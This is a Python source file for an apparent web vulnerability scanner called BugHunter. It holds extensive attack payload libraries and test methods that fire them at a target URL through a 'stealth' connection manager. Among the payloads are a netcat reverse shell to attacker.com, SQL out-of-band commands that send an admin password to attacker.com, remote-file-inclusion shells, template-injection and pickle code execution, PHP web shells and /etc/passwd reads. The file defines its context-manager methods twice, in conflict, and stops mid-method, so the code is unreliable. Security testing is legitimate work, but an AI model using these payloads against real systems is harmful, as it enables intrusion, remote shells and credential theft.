"""
Enhanced vulnerability scanner module for BugHunter.
Implements comprehensive vulnerability detection for 100+ vulnerability types.
Author: Infosec_Viking
Repository: https://github.com/MaxFiveTen/BugHunter
"""

import asyncio
import aiohttp
import re
import json
import ssl
import urllib.parse
import base64
import hashlib
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import logging
from datetime import datetime
import random
import string

from src.utils.connection_manager import StealthConnectionManager


class EnhancedVulnerabilityScanner:
    """Enhanced vulnerability scanner with 100+ vulnerability types."""
    
    def __init__(self, target_url: str, config):
        self.target_url = target_url
        self.config = config
        self.connection_manager = StealthConnectionManager(config)
        self.logger = logging.getLogger(__name__)
        self.vulnerabilities = []
        
        # Initialize payload libraries
        self._init_payloads()
    
    async def __aenter__(self):
        """Async context manager entry."""
        await self.connection_manager.initialize_session()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        await self.connection_manager.close()
        
    def _init_payloads(self):
        """Initialize comprehensive payload libraries."""
        
        # Advanced XSS payloads (including DOM, Reflected, Stored)
        self.xss_payloads = {
            'reflected': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>"
            ],
            'dom': [
                "<script>alert(document.domain)</script>",
                "<script>alert(window.location)</script>",
                "<script>alert(document.cookie)</script>",
                "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
                "<script>setTimeout('alert(1)',1000)</script>"
            ],
            'stored': [
                "<script>alert('Stored XSS')</script>",
                "<img src=x onerror=alert('Stored')>",
                "<svg onload=alert('Stored')>",
                "<iframe src=javascript:alert('Stored')></iframe>"
            ]
        }
        
        # Advanced SQL Injection payloads (all types)
        self.sql_payloads = {
            'union': [
                "' UNION SELECT NULL, NULL, NULL, NULL--",
                "' UNION SELECT 1, 2, 3, 4--",
                "' UNION SELECT username, password, NULL, NULL FROM users--",
                "' UNION SELECT table_name, column_name, NULL, NULL FROM information_schema.columns--"
            ],
            'boolean': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM users)>0--",
                "' AND (SELECT COUNT(*) FROM users)=0--"
            ],
            'time_based': [
                "'; WAITFOR DELAY '00:00:05'--",
                "'; SELECT SLEEP(5)--",
                "'; pg_sleep(5)--",
                "'; (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            ],
            'error_based': [
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--"
            ],
            'blind': [
                "' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND LENGTH(password)>10)--",
                "' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))>50)--"
            ],
            'out_of_band': [
                "'; EXEC xp_cmdshell('ping attacker.com');--",
                "'; SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='admin'), '.attacker.com\\share'));--"
            ]
        }
        
        # NoSQL Injection payloads
        self.nosql_payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "this.username == this.password"}',
            '{"$where": "function(){return true}"}',
            '{"$where": "this.username.match(/.*/)"}',
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
            '{"username": {"$in": ["admin", "administrator"]}}',
            '{"username": {"$nin": []}}'
        ]
        
        # Template Injection payloads (SSTI)
        self.ssti_payloads = {
            'jinja2': [
                '{{7*7}}',
                '{{config}}',
                '{{request}}',
                '{{self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
                '{{''.__class__.__mro__[2].__subclasses__()}}'
            ],
            'twig': [
                '{{7*7}}',
                '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
                '{{dump(app)}}'
            ],
            'smarty': [
                '{7*7}',
                '{php}echo `id`;{/php}',
                '{self::getStreamVariable("file:///proc/self/environ")}'
            ],
            'freemarker': [
                '${7*7}',
                '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }'
            ]
        }
        
        # Command Injection payloads
        self.command_payloads = [
            '; ls -la',
            '| whoami',
            '&& cat /etc/passwd',
            '`id`',
            '$(whoami)',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '&& whoami',
            '; ping -c 1 127.0.0.1',
            '| ping -c 1 127.0.0.1',
            '; nc -l -p 4444 -e /bin/bash',
            '| nc attacker.com 4444 -e /bin/bash'
        ]
        
        # File inclusion payloads
        self.file_inclusion_payloads = {
            'lfi': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '..%252f..%252f..%252fetc%2fpasswd',
                '/etc/passwd%00',
                '/etc/passwd%00.txt'
            ],
            'rfi': [
                'http://attacker.com/shell.txt',
                'ftp://attacker.com/shell.txt',
                'gopher://attacker.com/shell.txt',
                'data://text/plain,<?php system($_GET["cmd"]); ?>',
                'php://filter/read=convert.base64-encode/resource=index.php'
            ]
        }
        
        # Open Redirect payloads
        self.open_redirect_payloads = [
            'http://evil.com',
            'https://evil.com',
            '//evil.com',
            '/\\evil.com',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:alert(1)',
            'mailto:test@evil.com'
        ]
        
        # Host Header Injection payloads
        self.host_header_payloads = [
            'evil.com',
            'evil.com:80',
            'evil.com:443',
            'subdomain.evil.com',
            'evil.com\\@target.com',
            'evil.com#target.com',
            'evil.com?target.com',
            'evil.com/target.com'
        ]
        
        # HTTP Parameter Pollution payloads
        self.parameter_pollution_payloads = [
            'param=value1&param=value2',
            'param[]=value1&param[]=value2',
            'param=value1&param=value2&param=value3'
        ]
        
        # JWT Security test payloads
        self.jwt_payloads = [
            '{"alg":"none"}',
            '{"alg":"HS256","typ":"JWT"}',
            '{"alg":"RS256","typ":"JWT"}',
            '{"alg":"none","typ":"JWT"}'
        ]
        
        # OAuth/OIDC test payloads
        self.oauth_payloads = [
            'client_id=attacker',
            'redirect_uri=http://evil.com/callback',
            'response_type=code',
            'scope=read write admin'
        ]
        
        # API Security test payloads
        self.api_payloads = {
            'mass_assignment': [
                '{"username":"test","admin":true}',
                '{"user":"test","role":"admin"}',
                '{"name":"test","is_admin":true}'
            ],
            'injection': [
                '{"query":"admin\' OR 1=1--"}',
                '{"filter":"*"}',
                '{"search":"<script>alert(1)</script>"}'
            ]
        }
        
        # GraphQL Injection payloads
        self.graphql_payloads = [
            'query { __schema { types { name } } }',
            'query { user(id: "1\') { name } }',
            'mutation { deleteUser(id: "1\') }',
            'query { __typename }'
        ]
        
        # CSV Injection payloads
        self.csv_payloads = [
            '=cmd|"/c calc"!A0',
            '=HYPERLINK("javascript:alert(1)","Click me")',
            '@SUM(1+1)*cmd|"/c calc"!A0',
            '=2+5+cmd|"/c calc"!A0'
        ]
        
        # Email Header Injection payloads
        self.email_header_payloads = [
            'test@evil.com\r\nBcc: attacker@evil.com',
            'test@evil.com\r\nCc: attacker@evil.com',
            'test@evil.com\r\nSubject: Hacked',
            'test@evil.com\r\nTo: victim@target.com'
        ]
        
        # HTTP Response Splitting payloads
        self.response_splitting_payloads = [
            'test\r\nSet-Cookie: admin=true',
            'test\r\nLocation: http://evil.com',
            'test\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>'
        ]
        
        # HTTP Request Smuggling payloads
        self.request_smuggling_payloads = [
            'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n',
            'GET / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: target.com\r\nContent-Length: 10\r\n\r\nadmin=true'
        ]
        
        # Cache Poisoning payloads
        self.cache_poisoning_payloads = [
            'X-Forwarded-Host: evil.com',
            'X-Host: evil.com',
            'X-Forwarded-Server: evil.com',
            'Host: evil.com'
        ]
        
        # Subdomain Takeover payloads
        self.subdomain_takeover_payloads = [
            'github.io',
            'herokuapp.com',
            'netlify.com',
            'aws.amazon.com',
            'azurewebsites.net',
            'cloudflare.com'
        ]
        
        # Deserialization payloads
        self.deserialization_payloads = {
            'java': [
                'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHh4',
                'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHh4'
            ],
            'php': [
                'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
                'O:8:"stdClass":1:{s:4:"test";s:4:"test";}'
            ],
            'python': [
                'cos\nsystem\n(S\'id\'\ntR.',
                'cos\nsystem\n(S\'whoami\'\ntR.'
            ]
        }
        
        # Memory corruption payloads
        self.memory_corruption_payloads = {
            'buffer_overflow': [
                'A' * 1000,
                'A' * 10000,
                'A' * 100000
            ],
            'integer_overflow': [
                '2147483647',
                '4294967295',
                '9223372036854775807'
            ],
            'format_string': [
                '%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x',
                '%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s',
                '%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n'
            ]
        }
        
        # Cryptographic weakness payloads
        self.crypto_weakness_payloads = {
            'weak_hashes': [
                '5d41402abc4b2a76b9719d911017c592',  # MD5 of "hello"
                'aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d',  # SHA1 of "hello"
                '2cf24dba4f21b87e',  # Truncated SHA256
            ],
            'weak_ciphers': [
                'DES',
                'RC4',
                'MD5',
                'SHA1'
            ]
        }
        
        # Hardcoded credential patterns
        self.hardcoded_patterns = [
            'password',
            'secret',
            'key',
            'token',
            'api_key',
            'private_key',
            'admin',
            'root',
            'administrator',
            '123456',
            'password123',
            'admin123'
        ]
        
        # Race condition payloads
        self.race_condition_payloads = [
            'concurrent_requests',
            'timing_attack',
            'resource_contention'
        ]
        
        # DoS/DDoS payloads
        self.dos_payloads = {
            'slowloris': [
                'slow_request_headers',
                'incomplete_requests',
                'connection_flood'
            ],
            'resource_exhaustion': [
                'large_payload',
                'deep_nesting',
                'recursive_structure'
            ]
        }
        
        # WebSocket security payloads
        self.websocket_payloads = [
            '{"type":"message","data":"<script>alert(1)</script>"}',
            '{"type":"auth","token":"admin"}',
            '{"type":"subscribe","channel":"private"}'
        ]
        
        # OAuth/OIDC vulnerability payloads
        self.oauth_vuln_payloads = {
            'authorization_code': [
                'client_id=attacker&redirect_uri=http://evil.com',
                'response_type=code&client_id=attacker',
                'scope=read write admin&client_id=attacker'
            ],
            'implicit': [
                'response_type=token&client_id=attacker',
                'response_type=id_token&client_id=attacker'
            ],
            'pkce': [
                'code_challenge=invalid&code_verifier=invalid',
                'code_challenge_method=plain&code_challenge=test'
            ]
        }
        
        # SAML vulnerability payloads
        self.saml_payloads = [
            '<saml:Assertion><saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject></saml:Assertion>',
            '<saml:Assertion><saml:AttributeStatement><saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion>'
        ]
        
        # Two-factor authentication bypass payloads
        self.twofa_bypass_payloads = [
            'bypass_2fa',
            'skip_verification',
            'admin_override',
            'backup_codes'
        ]
        
        # File upload vulnerability payloads
        self.file_upload_payloads = {
            'executable': [
                '<?php system($_GET["cmd"]); ?>',
                '#!/bin/bash\nid',
                'import os; os.system("id")',
                'eval($_POST["cmd"]);'
            ],
            'svg_xss': [
                '<svg onload="alert(1)">',
                '<svg><script>alert(1)</script></svg>',
                '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>'
            ],
            'zip_slip': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'
            ]
        }
        
        # API rate limiting bypass payloads
        self.rate_limit_bypass_payloads = [
            'x_forwarded_for',
            'x_real_ip',
            'x_cluster_client_ip',
            'x_forwarded',
            'forwarded_for',
            'forwarded'
        ]
        
        # CORS misconfiguration payloads
        self.cors_payloads = [
            'Origin: http://evil.com',
            'Origin: https://evil.com',
            'Origin: null',
            'Origin: target.com.evil.com'
        ]
        
        # Security through obscurity bypass payloads
        self.obscurity_bypass_payloads = [
            'admin',
            'administrator',
            'login',
            'auth',
            'api',
            'test',
            'dev',
            'staging',
            'backup',
            'old'
        ]
        
        # Input validation bypass payloads
        self.input_validation_payloads = [
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:alert(1)',
            'onload=alert(1)',
            'onerror=alert(1)',
            'onclick=alert(1)'
        ]
        
        # Output encoding bypass payloads
        self.output_encoding_payloads = [
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            '&#60;script&#62;alert(1)&#60;/script&#62;',
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E'
        ]
        
        # Verbose error message patterns
        self.error_message_patterns = [
            'stack trace',
            'exception',
            'error at line',
            'fatal error',
            'warning:',
            'notice:',
            'mysql_fetch',
            'postgresql',
            'oracle',
            'sql server',
            'database error',
            'connection failed',
            'access denied',
            'permission denied',
            'file not found',
            'directory not found'
        ]
        
        # Information leakage patterns
        self.info_leakage_patterns = [
            'version',
            'build',
            'revision',
            'commit',
            'branch',
            'environment',
            'debug',
            'development',
            'test',
            'staging',
            'production',
            'internal',
            'private',
            'secret',
            'password',
            'key',
            'token',
            'api',
            'endpoint',
            'configuration',
            'settings',
            'database',
            'connection',
            'server',
            'host',
            'port',
            'path',
            'directory',
            'file',
            'backup',
            'log',
            'trace',
            'dump'
        ]
        
        # Session management vulnerability patterns
        self.session_vuln_patterns = [
            'session fixation',
            'session hijacking',
            'session prediction',
            'weak session id',
            'insecure session',
            'session timeout',
            'concurrent session',
            'session replay'
        ]
        
        # Authentication bypass patterns
        self.auth_bypass_patterns = [
            'admin',
            'administrator',
            'root',
            'user',
            'guest',
            'test',
            'demo',
            'admin:admin',
            'admin:password',
            'admin:123456',
            'root:root',
            'guest:guest',
            'test:test'
        ]
        
        # Authorization bypass patterns
        self.authz_bypass_patterns = [
            'role=admin',
            'level=admin',
            'type=admin',
            'status=admin',
            'permission=all',
            'access=full',
            'privilege=admin',
            'group=admin',
            'department=admin'
        ]
        
        # Cookie security patterns
        self.cookie_security_patterns = [
            'httponly',
            'secure',
            'samesite',
            'domain',
            'path',
            'expires',
            'max-age'
        ]
        
        # Password recovery vulnerability patterns
        self.password_recovery_patterns = [
            'reset token',
            'recovery code',
            'temporary password',
            'password reset',
            'forgot password',
            'account recovery'
        ]
        
        # Username enumeration patterns
        self.username_enum_patterns = [
            'user not found',
            'invalid username',
            'username does not exist',
            'account not found',
            'user not registered',
            'invalid user',
            'unknown user',
            'user not active',
            'account disabled',
            'user locked'
        ]
        
        # Brute force patterns
        self.brute_force_patterns = [
            'login attempt',
            'failed login',
            'invalid password',
            'wrong password',
            'incorrect password',
            'authentication failed',
            'login failed',
            'access denied',
            'unauthorized'
        ]
        
        # Credential stuffing patterns
        self.credential_stuffing_patterns = [
            'common passwords',
            'default passwords',
            'weak passwords',
            'password list',
            'breach data',
            'leaked credentials',
            'compromised accounts'
        ]
        
        # API security patterns
        self.api_security_patterns = [
            'api key',
            'access token',
            'bearer token',
            'authentication',
            'authorization',
            'rate limiting',
            'throttling',
            'api version',
            'endpoint',
            'method',
            'parameter',
            'response',
            'error',
            'status code'
        ]
        
        # GraphQL security patterns
        self.graphql_security_patterns = [
            'introspection',
            'query depth',
            'query complexity',
            'field resolution',
            'type system',
            'schema',
            'resolver',
            'mutation',
            'subscription'
        ]
        
        # NoSQL security patterns
        self.nosql_security_patterns = [
            'mongodb',
            'couchdb',
            'cassandra',
            'redis',
            'elasticsearch',
            'dynamodb',
            'document store',
            'key-value store',
            'column family',
            'graph database'
        ]
        
        # LDAP security patterns
        self.ldap_security_patterns = [
            'ldap bind',
            'ldap search',
            'ldap filter',
            'dn syntax',
            'ldap error',
            'directory service',
            'active directory',
            'openldap',
            '389 directory'
        ]
        
        # XPath security patterns
        self.xpath_security_patterns = [
            'xpath error',
            'xpath syntax',
            'xml parsing',
            'xpath injection',
            'xml injection',
            'xquery',
            'xml query'
        ]
        
        # Template injection patterns
        self.template_injection_patterns = [
            'template engine',
            'template rendering',
            'template compilation',
            'template execution',
            'server-side template',
            'client-side template',
            'jinja2',
            'twig',
            'smarty',
            'freemarker',
            'handlebars',
            'mustache'
        ]
        
        # CSV injection patterns
        self.csv_injection_patterns = [
            'csv export',
            'csv import',
            'spreadsheet',
            'excel',
            'formula injection',
            'macro injection',
            'command injection',
            'hyperlink injection'
        ]
        
        # Email header injection patterns
        self.email_header_injection_patterns = [
            'email header',
            'smtp header',
            'mail header',
            'header injection',
            'crlf injection',
            'email spoofing',
            'email forging'
        ]
        
        # HTTP response splitting patterns
        self.http_response_splitting_patterns = [
            'http response splitting',
            'crlf injection',
            'header injection',
            'response manipulation',
            'cache poisoning',
            'proxy poisoning'
        ]
        
        # HTTP request smuggling patterns
        self.http_request_smuggling_patterns = [
            'http request smuggling',
            'request smuggling',
            'http smuggling',
            'transfer encoding',
            'content length',
            'chunked encoding',
            'pipeline desync'
        ]
        
        # Cache poisoning patterns
        self.cache_poisoning_patterns = [
            'cache poisoning',
            'cache manipulation',
            'cache injection',
            'cache key',
            'cache value',
            'cache header',
            'cache control'
        ]
        
        # Subdomain takeover patterns
        self.subdomain_takeover_patterns = [
            'subdomain takeover',
            'dns takeover',
            'cname takeover',
            'domain takeover',
            'subdomain hijacking',
            'dns hijacking'
        ]
        
        # DNS rebinding patterns
        self.dns_rebinding_patterns = [
            'dns rebinding',
            'dns rebind',
            'dns pinning',
            'dns cache poisoning',
            'dns spoofing',
            'dns hijacking'
        ]
        
        # Deserialization patterns
        self.deserialization_patterns = [
            'deserialization',
            'object deserialization',
            'unserialize',
            'object injection',
            'java deserialization',
            'php deserialization',
            'python deserialization',
            '.net deserialization'
        ]
        
        # Memory corruption patterns
        self.memory_corruption_patterns = [
            'buffer overflow',
            'stack overflow',
            'heap overflow',
            'integer overflow',
            'integer underflow',
            'format string',
            'use after free',
            'double free',
            'null pointer dereference',
            'memory leak',
            'segmentation fault',
            'access violation'
        ]
        
        # Cryptographic patterns
        self.cryptographic_patterns = [
            'weak encryption',
            'weak cipher',
            'weak hash',
            'md5',
            'sha1',
            'des',
            'rc4',
            'weak ssl',
            'weak tls',
            'weak certificate',
            'self-signed certificate',
            'expired certificate'
        ]
        
        # Hardcoded credentials patterns
        self.hardcoded_credentials_patterns = [
            'hardcoded password',
            'hardcoded secret',
            'hardcoded key',
            'hardcoded token',
            'hardcoded credential',
            'embedded password',
            'embedded secret',
            'embedded key',
            'embedded token',
            'default password',
            'default secret',
            'default key',
            'default token'
        ]
        
        # Exposed API keys patterns
        self.exposed_api_keys_patterns = [
            'api key',
            'access key',
            'secret key',
            'private key',
            'public key',
            'auth key',
            'service key',
            'master key',
            'admin key',
            'root key'
        ]
        
        # Error message patterns
        self.error_message_vuln_patterns = [
            'verbose error',
            'detailed error',
            'stack trace',
            'exception details',
            'debug information',
            'technical details',
            'system information',
            'path disclosure',
            'version disclosure',
            'configuration disclosure'
        ]
        
        # Server-side template injection patterns
        self.ssti_patterns = [
            'server-side template injection',
            'ssti',
            'template injection',
            'template engine injection',
            'template rendering injection'
        ]
        
        # Client-side template injection patterns
        self.csti_patterns = [
            'client-side template injection',
            'csti',
            'angular template injection',
            'vue template injection',
            'react template injection'
        ]
        
        # Mass assignment patterns
        self.mass_assignment_patterns = [
            'mass assignment',
            'object injection',
            'parameter pollution',
            'attribute injection',
            'property injection'
        ]
        
        # Insecure direct object reference patterns
        self.idor_patterns = [
            'insecure direct object reference',
            'idor',
            'direct object reference',
            'object reference',
            'resource reference',
            'file reference'
        ]
        
        # Broken object level authorization patterns
        self.bola_patterns = [
            'broken object level authorization',
            'bola',
            'object level authorization',
            'resource authorization',
            'object authorization'
        ]
        
        # Broken function level authorization patterns
        self.bfa_patterns = [
            'broken function level authorization',
            'bfa',
            'function level authorization',
            'method authorization',
            'endpoint authorization'
        ]
        
        # Excessive data exposure patterns
        self.excessive_data_patterns = [
            'excessive data exposure',
            'data overexposure',
            'information disclosure',
            'data leakage',
            'sensitive data exposure'
        ]
        
        # Lack of resources and rate limiting patterns
        self.rate_limiting_patterns = [
            'rate limiting',
            'throttling',
            'resource limiting',
            'request limiting',
            'connection limiting',
            'bandwidth limiting',
            'dos protection',
            'ddos protection'
        ]
        
        # Missing CORS configuration patterns
        self.cors_patterns = [
            'cors',
            'cross-origin resource sharing',
            'origin header',
            'access-control-allow-origin',
            'access-control-allow-methods',
            'access-control-allow-headers',
            'access-control-allow-credentials'
        ]
        
        # Security through obscurity patterns
        self.obscurity_patterns = [
            'security through obscurity',
            'hidden functionality',
            'undocumented feature',
            'secret endpoint',
            'hidden parameter',
            'obscure configuration',
            'non-standard implementation'
        ]
        
        # Improper input validation patterns
        self.input_validation_patterns = [
            'input validation',
            'parameter validation',
            'data validation',
            'sanitization',
            'filtering',
            'escaping',
            'encoding'
        ]
        
        # Improper output encoding patterns
        self.output_encoding_patterns = [
            'output encoding',
            'response encoding',
            'html encoding',
            'url encoding',
            'javascript encoding',
            'css encoding',
            'xml encoding'
        ]
        
        # File upload vulnerability patterns
        self.file_upload_patterns = [
            'file upload',
            'file upload vulnerability',
            'unrestricted file upload',
            'malicious file upload',
            'executable file upload',
            'script upload',
            'shell upload'
        ]
        
        # Unrestricted file upload patterns
        self.unrestricted_file_upload_patterns = [
            'unrestricted file upload',
            'unlimited file upload',
            'no file type restriction',
            'no file size restriction',
            'no file content validation',
            'no file extension check',
            'no mime type check'
        ]
        
        # Zip slip vulnerability patterns
        self.zip_slip_patterns = [
            'zip slip',
            'zip traversal',
            'archive traversal',
            'compressed file traversal',
            'zip path traversal',
            'tar traversal',
            'rar traversal'
        ]
        
        # XXE via file upload patterns
        self.xxe_file_upload_patterns = [
            'xxe file upload',
            'xml file upload',
            'svg xxe',
            'xml external entity file upload',
            'xml injection file upload'
        ]
        
        # SVG file upload XSS patterns
        self.svg_xss_patterns = [
            'svg xss',
            'svg file upload xss',
            'svg script injection',
            'svg javascript injection',
            'svg onload xss'
        ]
        
        # PDF upload vulnerability patterns
        self.pdf_upload_patterns = [
            'pdf upload vulnerability',
            'pdf xss',
            'pdf javascript',
            'pdf form xss',
            'pdf annotation xss',
            'pdf action xss'
        ]
        
        # Insecure WebSocket implementation patterns
        self.websocket_patterns = [
            'websocket',
            'ws://',
            'wss://',
            'websocket security',
            'websocket vulnerability',
            'websocket injection',
            'websocket xss'
        ]
        
        # OAuth/OIDC vulnerability patterns
        self.oauth_vuln_patterns = [
            'oauth vulnerability',
            'oidc vulnerability',
            'oauth security',
            'oidc security',
            'oauth bypass',
            'oidc bypass',
            'oauth injection',
            'oidc injection'
        ]
        
        # JWT security issue patterns
        self.jwt_security_patterns = [
            'jwt security',
            'jwt vulnerability',
            'jwt bypass',
            'jwt injection',
            'jwt manipulation',
            'jwt forgery',
            'jwt replay'
        ]
        
        # SAML vulnerability patterns
        self.saml_vuln_patterns = [
            'saml vulnerability',
            'saml security',
            'saml bypass',
            'saml injection',
            'saml manipulation',
            'saml forgery',
            'saml replay'
        ]
        
        # Two-factor authentication bypass patterns
        self.twofa_bypass_patterns = [
            '2fa bypass',
            'two-factor bypass',
            'mfa bypass',
            'multi-factor bypass',
            'otp bypass',
            'totp bypass',
            'sms bypass',
            'email bypass'
        ]
        
    async def __aenter__(self):
        """Async context manager entry."""
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=30)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        )
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        if self.session:
            await self.session.close()
            
    async def make_request(self, url: str, method: str = 'GET', **kwargs) -> Optional[aiohttp.ClientResponse]:
        """Make HTTP request with error handling."""
        return await self.connection_manager.make_request(method, url, **kwargs)
            
    # ==================== CORE VULNERABILITY TESTS ====================
    
    async def test_advanced_xss(self) -> List[Dict]:
        """Test for advanced XSS vulnerabilities (DOM, Reflected, Stored)."""
        vulnerabilities = []
        
        xss_params = ['q', 'search', 'name', 'comment', 'message', 'input', 'text', 'content', 'description']
        
        for xss_type, payloads in self.xss_payloads.items():
            for param in xss_params:
                for payload in payloads:
                    try:
                        test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                        response = await self.make_request(test_url)
                        
                        if response:
                            content = await response.text()
                            if self._detect_xss_reflection(content, payload):
                                vulnerabilities.append({
                                    'type': f'Cross-Site Scripting (XSS - {xss_type.title()})',
                                    'severity': 'High',
                                    'parameter': param,
                                    'payload': payload,
                                    'url': test_url,
                                    'description': f'{xss_type.title()} XSS vulnerability detected in parameter: {param}',
                                    'confidence': 'Medium'
                                })
                                
                    except Exception as e:
                        self.logger.error(f"Advanced XSS test error: {str(e)}")
                        
        return vulnerabilities
        
    async def test_improper_authentication(self) -> List[Dict]:
        """Test for improper authentication vulnerabilities."""
        vulnerabilities = []
        
        auth_endpoints = ['/login', '/auth', '/signin', '/admin', '/dashboard']
        
        for endpoint in auth_endpoints:
            try:
                test_url = urljoin(self.target_url, endpoint)
                response = await self.make_request(test_url)
                
                if response and response.status == 200:
                    content = await response.text()
                    
                    # Check for weak authentication mechanisms
                    if 'password' in content.lower() and 'autocomplete="off"' not in content:
                        vulnerabilities.append({
                            'type': 'Improper Authentication',
                            'severity': 'Medium',
                            'url': test_url,
                            'description': 'Password field lacks autocomplete="off" attribute',
                            'confidence': 'High'
                        })
                        
                    # Check for missing password complexity requirements
                    if 'password' in content.lower() and 'minlength' not in content:
                        vulnerabilities.append({
                            'type': 'Improper Authentication',
                            'severity': 'Low',
                            'url': test_url,
                            'description': 'No password length requirements detected',
                            'confidence': 'Medium'
                        })
                        
            except Exception as e:
                self.logger.error(f"Improper authentication test error: {str(e)}")
                
        return vulnerabilities
        
    async def test_privilege_escalation(self) -> List[Dict]:
        """Test for privilege escalation vulnerabilities."""
        vulnerabilities = []
        
        privilege_params = ['role', 'level', 'type', 'status', 'permission', 'access', 'privilege', 'group', 'department']
        privilege_values = ['admin', 'administrator', 'root', 'superuser', 'manager', 'owner']
        
        for param in privilege_params:
            for value in privilege_values:
                try:
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(value)}"
                    response = await self.make_request(test_url)
                    
                    if response:
                        content = await response.text()
                        if self._detect_privilege_escalation(content, value):
                            vulnerabilities.append({
                                'type': 'Privilege Escalation',
                                'severity': 'Critical',
                                'parameter': param,
                                'payload': value,
                                'url': test_url,
                                'description': f'Potential privilege escalation via parameter: {param}',
                                'confidence': 'Medium'
                            })
                            
                except Exception as e:
                    self.logger.error(f"Privilege escalation test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_code_injection(self) -> List[Dict]:
        """Test for code injection vulnerabilities."""
        vulnerabilities = []
        
        code_params = ['code', 'script', 'eval', 'exec', 'function', 'method', 'class', 'namespace']
        
        code_payloads = [
            '<?php system($_GET["cmd"]); ?>',
            'eval("system(\'id\')")',
            'exec("whoami")',
            'system("id")',
            'shell_exec("id")',
            'passthru("id")',
            'popen("id", "r")',
            'proc_open("id", [], $pipes)'
        ]
        
        for param in code_params:
            for payload in code_payloads:
                try:
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                    response = await self.make_request(test_url)
                    
                    if response:
                        content = await response.text()
                        if self._detect_code_execution(content):
                            vulnerabilities.append({
                                'type': 'Code Injection',
                                'severity': 'Critical',
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'description': f'Code injection detected in parameter: {param}',
                                'confidence': 'High'
                            })
                            
                except Exception as e:
                    self.logger.error(f"Code injection test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_idor(self) -> List[Dict]:
        """Test for Insecure Direct Object Reference vulnerabilities."""
        vulnerabilities = []
        
        idor_params = ['id', 'user_id', 'file_id', 'document_id', 'order_id', 'account_id', 'profile_id']
        idor_values = ['1', '2', '3', 'admin', 'root', 'test', '0', '-1', '999999']
        
        for param in idor_params:
            for value in idor_values:
                try:
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(value)}"
                    response = await self.make_request(test_url)
                    
                    if response and response.status == 200:
                        content = await response.text()
                        if self._detect_idor_vulnerability(content, param, value):
                            vulnerabilities.append({
                                'type': 'Insecure Direct Object Reference (IDOR)',
                                'severity': 'High',
                                'parameter': param,
